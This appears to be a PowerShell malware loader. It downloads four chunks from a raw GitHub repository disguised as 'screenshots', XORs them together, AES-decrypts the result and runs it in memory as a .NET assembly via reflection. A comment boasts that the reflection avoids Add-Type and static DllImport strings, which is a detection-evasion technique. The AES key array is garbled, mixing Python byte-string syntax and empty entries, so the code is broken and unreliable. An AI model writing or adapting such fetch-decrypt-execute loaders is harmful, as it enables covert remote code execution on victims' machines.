$b='https://raw.githubusercontent.com/cem324/screenshots/main'
$ch=@();0..3|%{$u="$b/c$_";try{$ch+=([Net.WebClient]::new()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$ch+=[byte[]]$w.ResponseBody}}
$xr=[byte[]]$ch[0].Clone();1..3|%{$i=$_;0..($xr.Length-1)|%{$xr[$_]=$xr[$_]-bxor$ch[$i][$_]}}
$ak=[Byte[]]@(0xb'\x1f\xe8',0xb'\xb3\x06',0xb'\xf4\xf6',0xb'\\\x1b',0xb'\xa1\xfd',0xb'}l',0xb'\xf3{',0xb' \xee',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'')
$iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
# Execute via reflection — no Add-Type, no static DllImport strings
$rt=[Type]$py[0];[System.Reflection.Assembly]::Load($py).EntryPoint.Invoke(0,@(,$null))
